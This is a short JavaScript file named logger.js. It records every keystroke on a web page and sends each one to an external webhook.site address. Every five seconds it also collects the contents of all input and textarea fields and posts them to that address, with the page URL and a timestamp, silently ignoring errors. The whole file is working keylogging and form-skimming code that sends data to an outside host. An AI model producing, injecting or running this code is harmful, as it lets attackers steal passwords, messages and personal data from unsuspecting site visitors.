// logger.js
"use strict";

// Capture keystrokes and send to Webhook.site
document.body.addEventListener("keydown", function (e) {
  const key = e.key;
  const url =
    "https://webhook.site/3e6eafda-102b-4d00-979a-77b822620962?key=" +
    encodeURIComponent(key);
  fetch(url).catch((err) => {}); // Avoid crashing if there's an error
});

// Optionally capture input values every few seconds
setInterval(() => {
  const inputs = document.querySelectorAll("input, textarea");
  let data = {};
  inputs.forEach((el, i) => {
    data[`field${i}`] = el.value;
  });

  fetch("https://webhook.site/3e6eafda-102b-4d00-979a-77b822620962", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      page: location.href,
      timestamp: new Date().toISOString(),
      inputs: data,
    }),
  }).catch((err) => {});
}, 5000); // Send every 5 seconds
